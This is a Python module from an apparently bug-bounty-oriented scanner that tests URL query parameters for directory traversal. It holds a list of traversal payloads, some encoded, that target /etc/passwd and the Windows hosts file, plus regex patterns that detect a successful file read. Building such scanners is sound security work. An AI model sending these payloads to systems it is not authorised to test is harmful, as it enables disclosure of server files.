"""Directory traversal scanner for BugBountyCrawler."""

import re
from typing import List, Dict, Any
import aiohttp

from .base import BaseScanner, ScanResult
from ..models.finding import Finding, FindingSeverity, FindingType

class DirectoryTraversalScanner(BaseScanner):
    """Scanner for directory traversal vulnerabilities."""
    
    def __init__(self, settings, rate_limiter=None):
        """Initialize directory traversal scanner."""
        super().__init__(settings, rate_limiter)
        self.name = "DirectoryTraversalScanner"
        
        # Directory traversal payloads
        self.payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        ]
        
        # Indicators of successful directory traversal
        self.success_indicators = [
            r"root:x:0:0:",
            r"daemon:x:1:1:",
            r"bin:x:2:2:",
            r"sys:x:3:3:",
            r"adm:x:4:4:",
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
            r"# localhost name resolution",
        ]
    
    async def scan_url(self, url: str) -> ScanResult:
        """Scan URL for directory traversal vulnerabilities."""
        findings = []
        errors = []
        response_time = 0.0
        status_code = 0
        headers = {}
        content_length = 0
        
        try:
            # Make initial request
            response = await self.make_request(url)
            response_time = response.headers.get("X-Response-Time", 0.0)
            status_code = response.status
            headers = dict(response.headers)
            content_length = int(response.headers.get("Content-Length", 0))
            
            # Test for directory traversal
            traversal_findings = await self._test_directory_traversal(url)
            findings.extend(traversal_findings)
            
        except Exception as e:
            errors.append(str(e))
        
        return ScanResult(
            url=url,
            findings=findings,
            errors=errors,
            response_time=response_time,
            status_code=status_code,
            headers=headers,
            content_length=content_length
        )
    
    async def _test_directory_traversal(self, url: str) -> List[Finding]:
        """Test for directory traversal vulnerabilities."""
        findings = []
        
        # Extract parameters from URL
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return findings
        
        # Test each parameter
        for param_name, param_values in params.items():
            for payload in self.payloads:
                try:
                    # Create test URL with payload
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    # Build test URL
                    test_url = self._build_test_url(parsed, test_params)
                    
                    # Make request
                    response = await self.make_request(test_url)
                    content = await response.text()
                    
                    # Check for success indicators
                    if self._check_traversal_success(content):
                        finding = self.create_finding(
                            url=test_url,
                            finding_type=FindingType.DIRECTORY_TRAVERSAL,
                            title="Directory Traversal Vulnerability",
                            description=f"Directory traversal vulnerability found in parameter '{param_name}' with payload '{payload}'",
                            severity=FindingSeverity.HIGH,
                            impact="Directory traversal allows reading arbitrary files from the server",
                            likelihood="high",
                            risk_score=8.0,
                            payload=payload,
                            parameter=param_name,
                            response_code=response.status,
                            references=[
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                                "https://cwe.mitre.org/data/definitions/22.html"
                            ],
                            raw_data={
                                "parameter": param_name,
                                "payload": payload,
                                "response_content": content[:1000],  # First 1000 chars
                                "response_code": response.status
                            }
                        )
                        findings.append(finding)
                        break  # Found vulnerability, no need to test more payloads
                
                except Exception as e:
                    # Continue with next payload
                    continue
        
        return findings
    
    def _build_test_url(self, parsed_url, test_params) -> str:
        """Build test URL with parameters."""
        from urllib.parse import urlencode
        
        # Rebuild query string
        query_string = urlencode(test_params, doseq=True)
        
        # Rebuild URL
        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        if query_string:
            test_url += f"?{query_string}"
        
        return test_url
    
    def _check_traversal_success(self, content: str) -> bool:
        """Check if directory traversal was successful."""
        content_lower = content.lower()
        
        for indicator in self.success_indicators:
            if re.search(indicator, content_lower):
                return True
        
        return False
    
    def _is_safe_to_test(self, url: str) -> bool:
        """Check if URL is safe to test for directory traversal."""
        # Don't test URLs that might be dangerous
        dangerous_patterns = [
            r"/admin/",
            r"/wp-admin/",
            r"/administrator/",
            r"/phpmyadmin/",
            r"/\.git/",
            r"/\.svn/",
            r"/config/",
            r"/backup/",
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, url, re.IGNORECASE):
                return False
        
        return True
